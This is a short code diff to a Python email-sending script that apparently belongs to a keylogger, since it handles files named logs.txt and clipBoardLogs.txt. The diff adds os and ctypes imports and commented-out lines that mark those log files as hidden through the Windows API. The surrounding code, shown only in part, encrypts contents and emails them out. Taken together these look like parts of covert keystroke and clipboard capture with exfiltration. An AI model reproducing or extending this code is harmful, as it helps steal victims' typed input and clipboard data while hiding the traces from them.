@@ -1,6 +1,8 @@
 
 import smtplib
 from email.message import EmailMessage
+import os
+import ctypes
 from encryption import encryptContents 
 
 def sendEmail():
@@ -38,5 +40,17 @@ def sendEmail():
     except Exception as e:
         print("General Error:", e)
 
+    # if os.path.exists("logs.txt"):
+    #     ctypes.windll.kernel32.SetFileAttributesW("logs.txt", 0x02)
+    # if os.path.exists("clipBoardLogs.txt"):
+    #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.txt", 0x02)
+    # if os.path.exists("logs.bin"):
+    #     ctypes.windll.kernel32.SetFileAttributesW("logs.bin", 0x02)
+    # if os.path.exists("clipBoardLogs.bin"):
+    #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.bin", 0x02)
+
 if __name__ == "__main__":
     sendEmail()
+    
+
+
